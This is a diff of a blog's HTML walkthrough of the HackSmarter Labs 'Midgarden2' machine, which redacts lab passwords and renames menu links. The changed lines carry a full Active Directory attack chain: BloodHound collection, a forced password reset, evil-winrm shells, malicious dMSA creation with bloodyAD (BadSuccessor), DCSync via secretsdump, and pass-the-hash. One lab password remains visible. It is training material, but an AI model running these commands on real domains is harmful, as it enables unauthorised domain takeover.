@@ -10,7 +10,7 @@
   <meta property="og:title" content="Midgarden2 - BadSuccessor CVE-2025 dMSA Exploitation" />
   <meta property="og:description" content="HackSmarter Labs Midgarden2 walkthrough - exploiting Windows Server 2025 dMSA via BadSuccessor vulnerability for domain compromise. BloodHound, BloodyAD, and DCSync attack chain." />
   <meta property="og:image" content="https://z3rotrace.live/assets/midgarden2/administrator-shell.png" />
-  <meta property="og:url" content="https://z3rotrace.live/walkthroughs/midgarden2-badsuccessor.html" />
+  <meta property="og:url" content="https://z3rotrace.live/HackSmarter/midgarden2-badsuccessor.html" />
   <meta property="og:type" content="article" />
 
   <!-- Twitter Card tags -->
@@ -132,16 +132,16 @@
         </ul>
       </li>
       <li class="has-submenu">
-        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>Machines Walkthroughs</button>
+        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>HackSmarter Labs</button>
         <ul class="submenu">
-          <li><a href="welcome.html">Welcome - ADCS ESC1</a></li>
-          <li><a href="staged.html">Staged - HackSmarter Labs</a></li>
-          <li><a href="buildingmagic.html">BuildingMagic - HackSmarter Labs</a></li>
-          <li><a href="arasaka.html">Arasaka - HackSmarter Labs</a></li>
-          <li><a href="midgarden2-badsuccessor.html" aria-current="page">Midgarden2 - BadSuccessor</a></li>
-          <li><a href="banksmarter.html">BankSmarter - HackSmarter Labs</a></li>
-          <li><a href="ascension.html">Ascension - HackSmarter Labs</a></li>
-          <li><a href="slayer.html">Slayer - HackSmarter Labs</a></li>
+          <li><a href="welcome.html">Welcome</a></li>
+          <li><a href="staged.html">Staged</a></li>
+          <li><a href="buildingmagic.html">BuildingMagic</a></li>
+          <li><a href="arasaka.html">Arasaka</a></li>
+          <li><a href="midgarden2-badsuccessor.html" aria-current="page">Midgarden2</a></li>
+          <li><a href="banksmarter.html">BankSmarter</a></li>
+          <li><a href="ascension.html">Ascension</a></li>
+          <li><a href="slayer.html">Slayer</a></li>
           <li><a href="anomaly.html">Anomaly</a></li>
           <li><a href="sharethepain.html">ShareThePain</a></li>
           <li><a href="sysco.html">Sysco</a></li>
@@ -214,12 +214,12 @@ SMB   10.1.17.238  445  MIDGARDDC  [+] yggdrasil.hacksmarter\freyja:Fr3yja!Dr@g0
   <p><img src="../assets/midgarden2/thor-password-description.png" alt="Thor user has password in description field" loading="lazy"></p>
 
   <div class="key-finding">
-    <strong>New credentials discovered:</strong> <code>Thor:Th0r!W!nt3rFang</code>
+    <strong>New credentials discovered:</strong> <code>Thor:[REDACTED]</code>
   </div>
 
   <h3><span class="step">[Step 4]</span> BloodHound Collection</h3>
   <p>With Thor's credentials, I collected domain data for BloodHound analysis:</p>
-  <pre><code>$ nxc ldap 10.1.17.238 -u Thor -p 'Th0r!W!nt3rFang' --bloodhound --collection All</code></pre>
+  <pre><code>$ nxc ldap 10.1.17.238 -u Thor -p '[REDACTED]' --bloodhound --collection All</code></pre>
 
   <h3><span class="step">[Step 5]</span> Attack Path Analysis</h3>
   <p>BloodHound revealed a clear attack path. Thor has <strong>ForceChangePassword</strong> rights over the Hodr account:</p>
@@ -234,11 +234,11 @@ SMB   10.1.17.238  445  MIDGARDDC  [+] yggdrasil.hacksmarter\freyja:Fr3yja!Dr@g0
 
   <h3><span class="step">[Step 6]</span> Password Reset</h3>
   <p>Using Thor's ForceChangePassword privilege, I reset Hodr's password:</p>
-  <pre><code>$ net rpc password 'Hodr' 'Zerotrace123!' -U 'yggdrasil.hacksmarter'/'Thor'%'Th0r!W!nt3rFang' -S MidgardDC.yggdrasil.hacksmarter</code></pre>
+  <pre><code>$ net rpc password 'Hodr' '[REDACTED]' -U 'yggdrasil.hacksmarter'/'Thor'%'[REDACTED]' -S MidgardDC.yggdrasil.hacksmarter</code></pre>
 
   <h3><span class="step">[Step 7]</span> WinRM Shell</h3>
   <p>With the new password, I established a WinRM session as Hodr:</p>
-  <pre><code>$ evil-winrm -i 10.1.17.238 -u Hodr -p 'Zerotrace123!'
+  <pre><code>$ evil-winrm -i 10.1.17.238 -u Hodr -p '[REDACTED]'
 
 *Evil-WinRM* PS C:\Users\Hodr.YGGDRASIL\Documents></code></pre>
 
@@ -304,7 +304,7 @@ foreach ($OU in $OUs) {
 
   <h3><span class="step">[Step 11]</span> Automated Check with NetExec</h3>
   <p>NetExec has a built-in module to check for BadSuccessor vulnerability:</p>
-  <pre><code>$ nxc ldap 10.1.17.238 -u Hodr -p 'Zerotrace123!' -M badsuccessor</code></pre>
+  <pre><code>$ nxc ldap 10.1.17.238 -u Hodr -p '[REDACTED]' -M badsuccessor</code></pre>
 
   <p><img src="../assets/midgarden2/netexec-badsuccessor.png" alt="NetExec confirms BadSuccessor vulnerability" loading="lazy"></p>
 
@@ -315,7 +315,7 @@ $ source .venv/bin/activate
 $ pip install bloodyad</code></pre>
 
   <p>Then created a malicious dMSA that inherits Administrator privileges:</p>
-  <pre><code>$ bloodyAD -d yggdrasil.hacksmarter -u 'Hodr' -p 'Zerotrace123!' \
+  <pre><code>$ bloodyAD -d yggdrasil.hacksmarter -u 'Hodr' -p '[REDACTED]' \
     --host MIDGARDDC.yggdrasil.hacksmarter \
     add badSuccessor evil_dmsa1 \
     --ou 'OU=Web Servers,OU=Yggdrasil Servers,DC=yggdrasil,DC=hacksmarter'</code></pre>
@@ -367,7 +367,7 @@ $ secretsdump.py -k -no-pass 'yggdrasil.hacksmarter/evil_dmsa1$'@MidgardDC.yggdr
 
   <h3><span class="step">[Step 15]</span> Domain Admin Access</h3>
   <p>Using the extracted Administrator NTLM hash, I established a privileged session:</p>
-  <pre><code>$ evil-winrm -i 10.1.17.238 -u Administrator -H '&lt;ntlm_hash&gt;'
+  <pre><code>$ evil-winrm -i 10.1.17.238 -u Administrator -H '[REDACTED]'
 
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt</code></pre>
 
